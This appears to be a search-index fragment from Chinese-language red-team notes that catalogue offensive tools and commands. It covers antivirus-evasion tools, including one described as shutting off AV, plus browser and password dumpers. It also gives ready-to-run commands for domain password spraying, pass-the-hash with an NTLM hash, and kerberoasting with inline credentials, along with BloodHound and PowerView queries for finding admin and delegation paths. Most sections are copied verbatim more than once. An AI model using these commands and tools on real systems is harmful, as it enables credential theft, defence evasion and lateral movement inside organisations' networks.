\u5bfc\u51fa\u6d4f\u89c8\u5668\u6570\u636e","title":"HackBrowserData"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%26%E6%BC%8F%E6%89%AB/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%26%E6%BC%8F%E6%89%AB/#searchall","text":"\u96c6\u6210\u4e86HackBrowserData\u7684\u7efc\u5408\u4fe1\u606f\u63d0\u53d6\u5de5\u5177 https://github.com/Naturehi666/searchall","title":"searchall"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%26%E6%BC%8F%E6%89%AB/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%26%E6%BC%8F%E6%89%AB/#_14","text":"https://www.lingfengyun.com/ https://www.dashengpan.com/#/main/search?restype=1","title":"\u7f51\u76d8\u641c\u7d22\u5f15\u64ce"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%26%E6%BC%8F%E6%89%AB/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%26%E6%BC%8F%E6%89%AB/#_15","text":"","title":"\u7f51\u9875\u622a\u5c4f"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%26%E6%BC%8F%E6%89%AB/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%26%E6%BC%8F%E6%89%AB/#gowitness","text":"https://github.com/sensepost/gowitness","title":"gowitness"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%26%E6%BC%8F%E6%89%AB/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%26%E6%BC%8F%E6%89%AB/#domain_screen","text":"https://github.com/TheKingOfDuck/domain_screen","title":"domain_screen"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%85%8D%E6%9D%80/%E5%85%8D%E6%9D%80/","text":"\u514d\u6740 \u76ee\u5f55 shellcode shellghost \u5176\u5b83\u5bf9\u6297 nimblackout \u6362\u56fe\u6807 shellcode\u8f6cpowershell\u4e00\u53e5\u8bdd\u4e0a\u7ebf shellcode shellghost \u4f7fshellcode\u4ece\u542f\u52a8\u5230\u7ed3\u675f\u4e00\u76f4\u4e0d\u53ef\u89c1\u7684\u6280\u672f https://github.com/lem0nSec/ShellGhost \u5176\u5b83\u5bf9\u6297 nimblackout \u76f4\u63a5\u5173\u95edav\uff0c\u770b\u6837\u5b50\u5f88\u540a https://github.com/Helixo32/NimBlackout \u6362\u56fe\u6807 http://angusj.com/resourcehacker/ shellcode\u8f6cpowershell\u4e00\u53e5\u8bdd\u4e0a\u7ebf https://github.com/baiyies/PowerOneLiner.git","title":"\u514d\u6740"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%85%8D%E6%9D%80/%E5%85%8D%E6%9D%80/#_1","text":"","title":"\u514d\u6740"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%85%8D%E6%9D%80/%E5%85%8D%E6%9D%80/#_2","text":"shellcode shellghost \u5176\u5b83\u5bf9\u6297 nimblackout \u6362\u56fe\u6807 shellcode\u8f6cpowershell\u4e00\u53e5\u8bdd\u4e0a\u7ebf","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%85%8D%E6%9D%80/%E5%85%8D%E6%9D%80/#shellcode","text":"","title":"shellcode"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%85%8D%E6%9D%80/%E5%85%8D%E6%9D%80/#shellghost","text":"\u4f7fshellcode\u4ece\u542f\u52a8\u5230\u7ed3\u675f\u4e00\u76f4\u4e0d\u53ef\u89c1\u7684\u6280\u672f https://github.com/lem0nSec/ShellGhost","title":"shellghost"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%85%8D%E6%9D%80/%E5%85%8D%E6%9D%80/#_3","text":"","title":"\u5176\u5b83\u5bf9\u6297"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%85%8D%E6%9D%80/%E5%85%8D%E6%9D%80/#nimblackout","text":"\u76f4\u63a5\u5173\u95edav\uff0c\u770b\u6837\u5b50\u5f88\u540a https://github.com/Helixo32/NimBlackout","title":"nimblackout"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%85%8D%E6%9D%80/%E5%85%8D%E6%9D%80/#_4","text":"http://angusj.com/resourcehacker/","title":"\u6362\u56fe\u6807"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%85%8D%E6%9D%80/%E5%85%8D%E6%9D%80/#shellcodepowershell","text":"https://github.com/baiyies/PowerOneLiner.git","title":"shellcode\u8f6cpowershell\u4e00\u53e5\u8bdd\u4e0a\u7ebf"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/","text":"\u5185\u7f51\u5de5\u5177 \u5185\u7f51\u5de5\u5177\u5305 \u5185\u7f51\u4fa6\u67e5 \u72ec\u7acb\u5de5\u5177","title":"\u5185\u7f51\u5de5\u5177"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/#_1","text":"\u5185\u7f51\u5de5\u5177\u5305 \u5185\u7f51\u4fa6\u67e5 \u72ec\u7acb\u5de5\u5177","title":"\u5185\u7f51\u5de5\u5177"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/","text":"\u5185\u7f51\u4fa6\u67e5 \u76ee\u5f55 \u5bc6\u7801\u55b7\u6d12 hash\u55b7\u6d12 cme \u7a7asmb\u4f1a\u8bdd\u626b\u63cf mylanviewer \u638f\u5bc6\u7801 \u7efc\u5408\u626b\u63cf powerview-python\u7248 zscan bloodhound \u67e5\u770bacl powerview dsacls.exe Active Directory Module \u67e5spn \u57df\u7528\u6237\u53ef\u767b\u5f55\u4e3b\u673a\u67e5\u770b adfind net user \u5e38\u89c1cve\u626b\u63cf advul \u59d4\u6d3e \u975e\u7ea6\u675f\u6027\u59d4\u6d3e \u7ea6\u675f\u6027\u59d4\u6d3e \u6587\u4ef6\u641c\u7d22 \u5bc6\u7801\u55b7\u6d12 https://github.com/3gstudent/Homework-of-Powershell/blob/master/Invoke-DomainPasswordSprayOutsideTheDomain.ps1\uff08\u53ea\u80fd\u5728\u57df\u5916\u55b7\u6d12\uff09 Invoke-DomainPasswordSprayOutsideTheDomain -Domain \"10.0.0.10/DC=ds,DC=local\" -UserList .\\user.txt -Password p@ssw0rd -Verbose \u6216\u8005 https://github.com/dafthack/DomainPasswordSpray ,\u6709\u4e2aimport-module\u4f1a\u9047\u5230\u7684\u5751 https://github.com/dafthack/DomainPasswordSpray/issues/31 Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt \u4e0a\u9762\u4e24\u4e2aps1\u5728cs\u4e0a\u65e0\u6cd5\u76f4\u89c2\u770b\u5230\u55b7\u6d12\u60c5\u51b5 \u6216\u8005cme https://github.com/Porchetta-Industries/CrackMapExec \uff08m2\u82af\u7247\u4e0d\u592a\u517c\u5bb9\uff09 crackmapexec 10.0.2.0/24 -u \u2018admin\u2019 -p \u2018P@ssw0rd' \u6216\u8005 https://github.com/TarlogicSecurity/kerbrute.git python\u811a\u672c (\u529b\u8350\uff0c\u6302\u4ee3\u7406\u76f4\u63a5\u55b7\uff09 hash\u55b7\u6d12 cme cme smb 172.16.157.0/24 -u administrator -H 'aad3b435b51404eeaa35b51404ee:5509de4ff0a6e8d9f4a61100e51' --local-auth \u7a7asmb\u4f1a\u8bdd\u626b\u63cf mylanviewer \u6cc9\u987a\u7528\u7684\u3002\u5957\u4ee3\u7406\u4e0d\u597d\u7528\uff0c\u5f97\u5728\u7269\u7406\u673a\u641e \u638f\u5bc6\u7801 https://github.com/RowTeam/SharpDecryptPwd \u7efc\u5408\u638f https://github.com/QAX-A-Team/BrowserGhost \u53ea\u638f\u6d4f\u89c8\u5668\uff0c\u5e74\u4ee3\u4e45\u8fdc \u7efc\u5408\u626b\u63cf powerview-python\u7248 https://github.com/the-useless-one/pywerview.git https://github.com/aniqfakhrul/powerview.py \u9700\u8981\u63a7\u5236\u7684\u673a\u5668\u5f00\u542fldap zscan https://github.com/zyylhn/zscan \u7aef\u53e3\u626b\u63cf\u5668+\u5bc6\u7801\u7206\u7834\u5de5\u5177+\u90e8\u5206cve\u68c0\u6d4b bloodhound \u8981\u5148\u88c5neo4j\uff0c\u56fe\u50cf\u5316\u5c55\u793a \u67e5\u770b\u6bcf\u4e2a\u673a\u5668\u7684\u7ba1\u7406\u5458\u8d26\u6237\u6709\u54ea\u4e9b MATCH (c:Computer) OPTIONAL MATCH (u1:User)-[:AdminTo]->(c) OPTIONAL MATCH (u2:User)-[:MemberOf*1..]->(:Group)-[:AdminTo]->(c) WITH COLLECT(u1) + COLLECT(u2) AS tempVar,c UNWIND tempVar AS admins RETURN c.name AS computerName,admins.name AS adminName ORDER BY computerName ASC \u67e5\u770bacl powerview \u53ef\u80fd\u5b58\u5728\u786e\u5b9eIdentityReference\u7684\u60c5\u51b5\uff0c\u4ece\u800c\u5bfc\u81f4 \u201c\u4e0d\u80fd\u76f4\u89c2\u7684\u77e5\u9053\u54ea\u4e2a\u7528\u6237\u7684\u8be5\u6743\u9650\u4f5c\u7528\u4e8e\u6b64\u7528\u6237\u201d \u4e0d\u8fc7\u53ef\u4ee5\u6839\u636eSecurityIdentifier\u6307\u5411\u7684sid\u63a8\u65ad Get-ObjectAcl -samAccountName username -ResolveGUIDs \u67e5\u770b\u8c01\u5bf9bob\u6709genericall\u6743\u9650 Get-ObjectAcl -samAccountName bob -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq \"GenericAll\"} \u67e5\u770bbob\u5bf9\u54ea\u4e2a\u7528\u6237\u6709\u6743\u9650 Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq \"bob\"} \u82e5poweiview\u6ca1\u6709IdentityReference\u5c5e\u6027 Get-ObjectAcl -ResolveGUIDs | ? {$_.SecurityIdentifier -eq \"SID-xxx-x-x-x-xx\"} \u67e5\u770b\u4efb\u4f55\u7528\u6237\u5bf9\u67d0\u7528\u6237\u7ec4\u7684\u6743\u9650 \u5728distinguishedname\u4e2d\u627e\u5230\u67d0\u7528\u6237\u7ec4\u7684\u5bf9ldap\u8def\u5f84 Get-NetGroup \"domain admins\" -FullData \u8fdb\u884cacl\u67e5\u8be2 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq \"CN=Domain Admins,CN=Users,DC=offense,DC=local\"} dsacls.exe dsacls \"CN=bob,CN=Users,DC=cia,DC=gov\" Active Directory Module \u5728Windows Server 2008 R2\u6216\u8005\u66f4\u9ad8\u7684\u7248\u672c\u7684powershell\u63a7\u5236\u53f0\u6211\u4eec\u9700\u8981\u5728\u4f7f\u7528\u4e4b\u524d\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\u5c06\u6a21\u5757\u4f5c\u4e3a\u529f\u80fd\u6dfb\u52a0\u5230\u670d\u52a1\u5668\u7ba1\u7406\u5668\u4e2d\uff1a Import-Module ServerManager Add-WindowsFeature RSAT-AD-PowerShell import-module ActiveDirectory (Get-Acl -Path \"AD:CN=bob,CN=Users,DC=cia,DC=gov\").access \u67e5spn impacket getuserspns.py py -3 GetUserSPNs.py test.com/administrator:1qaz@WSX -target-domain test.com \u57df\u7528\u6237\u53ef\u767b\u5f55\u4e3b\u673a\u67e5\u770b adfind \u67e5\u8be2\u67d0\u4e2a\u57df\u7528\u6237\u80fd\u767b\u5f55\u54ea\u4e9b\u673a\u5668\uff0c-h\u53c2\u6570\u6307\u5b9aldap\u7684\u6570\u636e\u5e93\u670d\u52a1\u5668 AdFind.exe -sc u:xiaoming userWorkstations -h ad.caonima.com \u67e5\u8be2\u67d0\u4e2a\u57df\u7528\u6237\u6b63\u5728\u767b\u5f55\u54ea\u53f0\u4e3b\u673a net user net user xxx /domain \u53ef\u5141\u8bb8\u7684\u5de5\u4f5c\u7ad9\u91cc\u4fbf\u662f \u5e38\u89c1cve\u626b\u63cf advul https://github.com/Amulab/advul \u59d4\u6d3e \u975e\u7ea6\u675f\u6027\u59d4\u6d3e \u626b\u63cf Get-NetUser -Domain de1ay.com|? {$_.useraccountcontrl -like \"*trusted_for_delegation*\"} \u7ea6\u675f\u6027\u59d4\u6d3e \u626b\u63cf Get-NetUser -trustedtoauth -Domain shfe.com.cn \u6587\u4ef6\u641c\u7d22 everything\uff0c\u53ef\u4ee5\u76f4\u63a5\u8d77\u4e00\u4e2ahttp\u7aef\u53e3\u7528\u6765\u67e5\u6587\u4ef6 https://www.freebuf.com/sectool/261723.html","title":"\u5185\u7f51\u4fa6\u67e5"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/#_1","text":"","title":"\u5185\u7f51\u4fa6\u67e5"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/#_2","text":"\u5bc6\u7801\u55b7\u6d12 hash\u55b7\u6d12 cme \u7a7asmb\u4f1a\u8bdd\u626b\u63cf mylanviewer \u638f\u5bc6\u7801 \u7efc\u5408\u626b\u63cf powerview-python\u7248 zscan bloodhound \u67e5\u770bacl powerview dsacls.exe Active Directory Module \u67e5spn \u57df\u7528\u6237\u53ef\u767b\u5f55\u4e3b\u673a\u67e5\u770b adfind net user \u5e38\u89c1cve\u626b\u63cf advul \u59d4\u6d3e \u975e\u7ea6\u675f\u6027\u59d4\u6d3e \u7ea6\u675f\u6027\u59d4\u6d3e \u6587\u4ef6\u641c\u7d22","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/#_3","text":"https://github.com/3gstudent/Homework-of-Powershell/blob/master/Invoke-DomainPasswordSprayOutsideTheDomain.ps1\uff08\u53ea\u80fd\u5728\u57df\u5916\u55b7\u6d12\uff09 Invoke-DomainPasswordSprayOutsideTheDomain -Domain \"10.0.0.10/DC=ds,DC=local\" -UserList .\\user.txt -Password p@ssw0rd -Verbose \u6216\u8005 https://github.com/dafthack/DomainPasswordSpray ,\u6709\u4e2aimport-module\u4f1a\u9047\u5230\u7684\u5751 https://github.com/dafthack/DomainPasswordSpray/issues/31 Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt \u4e0a\u9762\u4e24\u4e2aps1\u5728cs\u4e0a\u65e0\u6cd5\u76f4\u89c2\u770b\u5230\u55b7\u6d12\u60c5\u51b5 \u6216\u8005cme https://github.com/Porchetta-Industries/CrackMapExec \uff08m2\u82af\u7247\u4e0d\u592a\u517c\u5bb9\uff09 crackmapexec 10.0.2.0/24 -u \u2018admin\u2019 -p \u2018P@ssw0rd' \u6216\u8005 https://github.com/TarlogicSecurity/kerbrute.git python\u811a\u672c (\u529b\u8350\uff0c\u6302\u4ee3\u7406\u76f4\u63a5\u55b7\uff09","title":"\u5bc6\u7801\u55b7\u6d12"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/#hash","text":"","title":"hash\u55b7\u6d12"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/#cme","text":"cme smb 172.16.157.0/24 -u administrator -H 'aad3b435b51404eeaa35b51404ee:5509de4ff0a6e8d9f4a61100e51' --local-auth","title":"cme"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/#smb","text":"","title":"\u7a7asmb\u4f1a\u8bdd\u626b\u63cf"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/#mylanviewer","text":"\u6cc9\u987a\u7528\u7684\u3002\u5957\u4ee3\u7406\u4e0d\u597d\u7528\uff0c\u5f97\u5728\u7269\u7406\u673a\u641e","title":"mylanviewer"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/#_4","text":"https://github.com/RowTeam/SharpDecryptPwd \u7efc\u5408\u638f https://github.com/QAX-A-Team/BrowserGhost \u53ea\u638f\u6d4f\u89c8\u5668\uff0c\u5e74\u4ee3\u4e45\u8fdc","title":"\u638f\u5bc6\u7801"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/#_5","text":"","title":"\u7efc\u5408\u626b\u63cf"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/#powerview-python","text":"https://github.com/the-useless-one/pywerview.git https://github.com/aniqfakhrul/powerview.py \u9700\u8981\u63a7\u5236\u7684\u673a\u5668\u5f00\u542fldap","title":"powerview-python\u7248"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/#zscan","text":"https://github.com/zyylhn/zscan \u7aef\u53e3\u626b\u63cf\u5668+\u5bc6\u7801\u7206\u7834\u5de5\u5177+\u90e8\u5206cve\u68c0\u6d4b","title":"zscan"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/#bloodhound","text":"\u8981\u5148\u88c5neo4j\uff0c\u56fe\u50cf\u5316\u5c55\u793a \u67e5\u770b\u6bcf\u4e2a\u673a\u5668\u7684\u7ba1\u7406\u5458\u8d26\u6237\u6709\u54ea\u4e9b MATCH (c:Computer) OPTIONAL MATCH (u1:User)-[:AdminTo]->(c) OPTIONAL MATCH (u2:User)-[:MemberOf*1..]->(:Group)-[:AdminTo]->(c) WITH COLLECT(u1) + COLLECT(u2) AS tempVar,c UNWIND tempVar AS admins RETURN c.name AS computerName,admins.name AS adminName ORDER BY computerName ASC","title":"bloodhound"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/#acl","text":"","title":"\u67e5\u770bacl"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/#powerview","text":"\u53ef\u80fd\u5b58\u5728\u786e\u5b9eIdentityReference\u7684\u60c5\u51b5\uff0c\u4ece\u800c\u5bfc\u81f4 \u201c\u4e0d\u80fd\u76f4\u89c2\u7684\u77e5\u9053\u54ea\u4e2a\u7528\u6237\u7684\u8be5\u6743\u9650\u4f5c\u7528\u4e8e\u6b64\u7528\u6237\u201d \u4e0d\u8fc7\u53ef\u4ee5\u6839\u636eSecurityIdentifier\u6307\u5411\u7684sid\u63a8\u65ad Get-ObjectAcl -samAccountName username -ResolveGUIDs \u67e5\u770b\u8c01\u5bf9bob\u6709genericall\u6743\u9650 Get-ObjectAcl -samAccountName bob -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq \"GenericAll\"} \u67e5\u770bbob\u5bf9\u54ea\u4e2a\u7528\u6237\u6709\u6743\u9650 Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq \"bob\"} \u82e5poweiview\u6ca1\u6709IdentityReference\u5c5e\u6027 Get-ObjectAcl -ResolveGUIDs | ? {$_.SecurityIdentifier -eq \"SID-xxx-x-x-x-xx\"} \u67e5\u770b\u4efb\u4f55\u7528\u6237\u5bf9\u67d0\u7528\u6237\u7ec4\u7684\u6743\u9650 \u5728distinguishedname\u4e2d\u627e\u5230\u67d0\u7528\u6237\u7ec4\u7684\u5bf9ldap\u8def\u5f84 Get-NetGroup \"domain admins\" -FullData \u8fdb\u884cacl\u67e5\u8be2 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq \"CN=Domain Admins,CN=Users,DC=offense,DC=local\"}","title":"powerview"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/#dsaclsexe","text":"dsacls \"CN=bob,CN=Users,DC=cia,DC=gov\"","title":"dsacls.exe"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/#active-directory-module","text":"\u5728Windows Server 2008 R2\u6216\u8005\u66f4\u9ad8\u7684\u7248\u672c\u7684powershell\u63a7\u5236\u53f0\u6211\u4eec\u9700\u8981\u5728\u4f7f\u7528\u4e4b\u524d\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\u5c06\u6a21\u5757\u4f5c\u4e3a\u529f\u80fd\u6dfb\u52a0\u5230\u670d\u52a1\u5668\u7ba1\u7406\u5668\u4e2d\uff1a Import-Module ServerManager Add-WindowsFeature RSAT-AD-PowerShell import-module ActiveDirectory (Get-Acl -Path \"AD:CN=bob,CN=Users,DC=cia,DC=gov\").access","title":"Active Directory Module"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/#spn","text":"impacket getuserspns.py py -3 GetUserSPNs.py test.com/administrator:1qaz@WSX -target-domain test.com","title":"\u67e5spn"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/#_6","text":"","title":"\u57df\u7528\u6237\u53ef\u767b\u5f55\u4e3b\u673a\u67e5\u770b"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/#adfind","text":"\u67e5\u8be2\u67d0\u4e2a\u57df\u7528\u6237\u80fd\u767b\u5f55\u54ea\u4e9b\u673a\u5668\uff0c-h\u53c2\u6570\u6307\u5b9aldap\u7684\u6570\u636e\u5e93\u670d\u52a1\u5668 AdFind.exe -sc u:xiaoming userWorkstations -h ad.caonima.com 